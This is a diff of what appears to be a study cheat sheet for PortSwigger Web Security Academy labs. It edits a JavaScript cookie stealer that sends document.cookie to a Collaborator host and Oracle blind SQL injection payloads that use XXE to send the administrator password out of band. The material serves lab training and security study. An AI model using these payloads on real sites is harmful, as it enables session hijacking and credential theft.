@@ -444,7 +444,7 @@ Host: 0a5c003203fe8128c1555f3a007600d0.web-security-academy.net
 Host: exploit-0a99003a0303811bc10e5ec601ad00e7.exploit-server.net
 ```
 
->Host cookie stealer JavaScript point to above path on exploit server.  
+>Place the JavaScript code to perform a cookie stealer on exploit server.  
 
 ```
 document.location='https://Collaborator.com/?cookies='+document.cookie;
@@ -968,13 +968,18 @@ csrf=TOKEN&username=administrator
 >Target is vulnerable to Out of band data exfiltration using Blind SQL exploitation query. In this case the trackingID cookie.  Below is combined SQL injection with basic XXE payloads.  
 
 ```sql
-TrackingId=cookievaluex'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.COLLABORATOR.NET/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```  
 
 ![Blind SQL injection with out-of-band data exfil](images/blind-SQL-injection-out-of-band-exfil.png)  
-
-
+  
 [PortSwigger Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)  
+  
+```sql
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR.NET/">+%25remote%3b]>'),'/l')+FROM+dual--
+```  
+  
+[PortSwigger Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)  
 
 >Using SQLMAP to enumerate tracking cookie by provding -r REQUESTFILE to Load HTTP request from a file.  
 
